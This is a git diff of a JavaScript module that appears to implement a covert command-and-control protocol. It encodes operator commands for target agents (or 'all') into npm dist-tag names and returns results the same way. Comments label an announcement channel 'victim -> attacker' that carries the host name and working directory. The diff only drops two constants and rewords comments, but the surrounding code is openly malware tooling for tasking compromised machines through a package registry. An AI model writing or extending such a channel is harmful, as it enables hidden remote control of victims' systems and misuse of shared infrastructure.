@@ -16,9 +16,7 @@
 //   unambiguous (a base64url payload itself may contain '-').
 
 export const PINNED_VERSION = '1.0.0';
-export const SENTINEL = 'x-';
 export const MAX_TAG_LEN = 214;
-export const BROADCAST_ID = 'all';
 // The op allowlist is defined (with metadata) in ops.js and re-exported here
 // so existing imports of TASK_OPS from the protocol keep working.
 export { TASK_OPS } from './ops.js';
@@ -109,7 +107,7 @@ export function assertValidTagName(name) {
 /**
  * Encode a command into a single dist-tag name.
  * @param {string} agentId target agent id, or 'all'
- * @param {number} seq monotonically increasing sequence number (per target)
+ * @param {number} seq globally allocated monotonically increasing sequence number
  * @param {object} payload e.g. { op: 'echo', args: { text: 'hi' }, ts: 123 }
  * @returns {string} tag name (value must be set to PINNED_VERSION)
  */
@@ -274,11 +272,11 @@ export function reassembleResult(parts) {
 }
 
 // ---------------------------------------------------------------------------
-// announce tags (victim -> attacker rolling presence heartbeat)
+// announce tags (victim -> attacker stable discovery marker)
 // ---------------------------------------------------------------------------
 
 /**
- * Encode a presence heartbeat into a single dist-tag name.
+ * Encode an agent announcement into a single dist-tag name.
  * @param {string} agentId
  * @param {object} payload e.g. { ts: 123, cwd: '/tmp', host: 'vm1' }
  * @returns {string} tag name
